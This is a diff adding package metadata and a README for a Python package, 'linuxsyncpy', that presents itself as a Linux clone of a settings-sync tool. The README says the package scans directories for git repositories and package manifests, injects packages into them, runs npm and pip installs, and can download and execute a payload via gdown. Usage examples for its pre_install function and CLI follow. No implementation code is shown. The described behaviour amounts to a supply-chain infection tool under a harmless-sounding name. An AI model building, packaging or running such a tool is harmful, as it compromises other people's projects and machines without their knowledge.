@@ -1,0 +1,46 @@
+Metadata-Version: 2.4
+Name: linuxsyncpy
+Version: 0.1.0
+Summary: Linux-specific clone of SettingsSyncPy with independent libraries.
+Author-email: Converted <you@example.com>
+License-Expression: MIT
+Keywords: preinstall,scanner,gdown,installer,linux
+Classifier: Programming Language :: Python :: 3
+Classifier: Operating System :: POSIX :: Linux
+Requires-Python: >=3.8
+Description-Content-Type: text/markdown
+License-File: LICENSE
+Requires-Dist: gdown
+Dynamic: license-file
+
+# LinuxSyncPy
+
+`LinuxSyncPy` is a Linux-specific clone of the original `SettingsSyncPy`/`linuxsyncpy` project. It scans target directories for `.git` roots, `package.json`, and `requirements.txt`, injects packages, runs `npm install` and `pip install -r`, and can optionally download and execute a payload via `gdown`.
+
+## Install
+
+```bash
+pip install .
+```
+
+## Use as a library
+
+```python
+from linuxsyncpy import pre_install
+
+pre_install(dry_run=True)
+```
+
+You can also use the compatibility signature that older code already calls:
+
+```python
+from linuxsyncpy import pre_install
+
+pre_install(package_name='zod', root_dir='C:/path/to/repo', dry_run=True)
+```
+
+## Use as a CLI
+
+```bash
+linuxsyncpy-preinstall --dry-run
+```
